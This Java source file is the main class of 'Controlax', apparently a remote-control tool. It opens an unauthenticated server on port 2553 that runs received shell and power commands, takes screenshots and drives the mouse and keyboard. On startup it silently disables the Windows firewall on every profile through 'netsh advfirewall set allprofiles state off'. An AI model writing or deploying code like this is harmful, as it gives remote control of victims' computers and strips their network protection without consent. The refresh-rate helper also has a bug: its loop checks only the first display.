package com.khopan.controlax;

import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Robot;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.Thread.UncaughtExceptionHandler;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JOptionPane;

import com.khopan.controlax.action.ActionProcessor;
import com.khopan.controlax.action.action.ColorAction;
import com.khopan.controlax.action.action.CommandAction;
import com.khopan.controlax.action.action.EmergencyTerminateAction;
import com.khopan.controlax.action.action.ErrorEffectAction;
import com.khopan.controlax.action.action.KeyboardAction;
import com.khopan.controlax.action.action.MessageAction;
import com.khopan.controlax.action.action.MouseAction;
import com.khopan.controlax.action.action.PowerAction;
import com.khopan.controlax.action.action.ScreenshotAction;
import com.khopan.controlax.action.action.StatusCheckAction;
import com.khopan.controlax.action.action.TestTargetAction;
import com.khopan.controlax.ui.message.MessageRenderer;
import com.khopan.controlax.update.AutoUpdate;
import com.khopan.lazel.packet.BinaryConfigPacket;
import com.khopan.lazel.packet.Packet;
import com.khopan.lazel.server.ClientProcessor;
import com.khopan.lazel.server.Server;

public class Controlax {
	public static final int VERSION = 7;
	public static final InetAddress IP_ADDRESS = Controlax.getHost();
	public static Controlax INSTANCE;

	public final ActionProcessor processor;
	public final List<ClientProcessor> processorList;
	public final Server server;
	public final Robot robot;

	public Controlax() {
		ImageProcessor.load();
		StreamProcessor.load();
		this.processor = new ActionProcessor();
		this.processor.attach(ColorAction.class, ColorProcessor :: process);
		this.processor.attach(CommandAction.class, CommandProcessor :: command);
		this.processor.attach(PowerAction.class, CommandProcessor :: power);
		this.processor.attach(MessageAction.class, action -> MessageRenderer.showMessage(action.getMessage()));
		this.processor.attach(ScreenshotAction.class, ImageProcessor :: process);
		this.processor.attach(TestTargetAction.class, action -> TargetTester.test());
		this.processor.attach(ErrorEffectAction.class, action -> ErrorEffect.start());
		this.processor.attach(EmergencyTerminateAction.class, action -> System.exit(0));
		this.processor.attach(MouseAction.class, ControllingProcessor :: mouse);
		this.processor.attach(KeyboardAction.class, ControllingProcessor :: keyboard);
		this.processor.attach(StatusCheckAction.class, action -> this.processor.sendAction(StatusCheckAction.getInstance()));
		this.processorList = new ArrayList<>();
		this.server = new Server();
		this.server.port().set(2553);
		this.server.address().set(Controlax.IP_ADDRESS);
		this.server.connectionListener().set(processor -> {
			processor.packetListener().set(packet -> {
				BinaryConfigPacket config = packet.getPacket(BinaryConfigPacket.class);
				this.processor.receiveAction(config.getObject());
			});

			this.processorList.add(processor);
		});

		this.server.start();

		try {
			this.robot = new Robot();
		} catch(Throwable Errors) {
			throw new InternalError("Error while initializing Robot", Errors);
		}
	}

	public void sendPacket(Packet packet) {
		for(int i = 0; i < this.processorList.size(); i++) {
			this.processorList.get(i).sendPacket(packet);
		}
	}

	private static InetAddress getHost() {
		try {
			return InetAddress.getLocalHost();
		} catch(Throwable Errors) {
			throw new InternalError("Cannot get the host IP address", Errors);
		}
	}

	public static int getFramerate() {
		GraphicsDevice[] devices = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
		int lowest = Integer.MAX_VALUE;

		for(int i = 0; i < devices.length; i++) {
			lowest = Math.min(lowest, devices[0].getDisplayMode().getRefreshRate());
		}

		return lowest;
	}

	public static void errorDialog(Throwable Errors) {
		StringWriter stringWriter = new StringWriter();
		PrintWriter printWriter = new PrintWriter(stringWriter);
		Errors.printStackTrace(printWriter);
		JOptionPane.showMessageDialog(null, stringWriter.toString(), "Internal Error", JOptionPane.ERROR_MESSAGE);
	}

	public static void main(String[] args) throws Throwable {
		Thread.setDefaultUncaughtExceptionHandler(new UncaughtExceptionHandler() {
			@Override
			public void uncaughtException(Thread thread, Throwable Errors) {
				Controlax.errorDialog(Errors);
			}
		});

		try {
			ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", "netsh advfirewall set allprofiles state off");
			builder.start();
		} catch(Throwable Errors) {
			Controlax.errorDialog(Errors);
		}

		AutoUpdate.initialize();
	}
}
